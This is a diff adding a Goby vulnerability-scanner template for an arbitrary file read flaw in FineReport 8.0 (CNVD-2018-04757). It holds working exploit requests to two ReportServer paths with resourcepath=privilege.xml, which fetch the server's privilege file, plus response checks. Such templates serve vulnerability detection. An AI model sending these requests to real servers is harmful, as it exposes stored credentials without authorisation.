@@ -1,0 +1,84 @@
+{
+      "Name": "帆软报表 v8.0 任意文件读取漏洞 CNVD-2018-04757",
+      "Level": "1",
+      "Tags": [
+            "任意文件读取"
+      ],
+      "GobyQuery": "app=\"fanruansem-FineReport\"",
+      "Description": "FineReport报表软件是一款纯Java编写的，集数据展示(报表)和数据录入(表单)功能于一身的企业级web报表工具。\n\nFineReport 8.0版本存在任意文件读取漏洞，攻击者可利用漏洞读取网站任意文件。",
+      "Product": "FineReport 8.0版本",
+      "Homepage": "PeiQi",
+      "Author": "PeiQi",
+      "Impact": "<p>🐏</p>",
+      "Recommandation": "",
+      "References": [
+            "http://wiki.peiqi.tech"
+      ],
+      "ScanSteps": [
+            "OR",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml",
+                        "follow_redirect": true,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "CDATA",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            },
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml",
+                        "follow_redirect": true,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "CDATA",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "PostTime": "2021-03-21 19:44:01",
+      "GobyVersion": "1.8.237"
+}
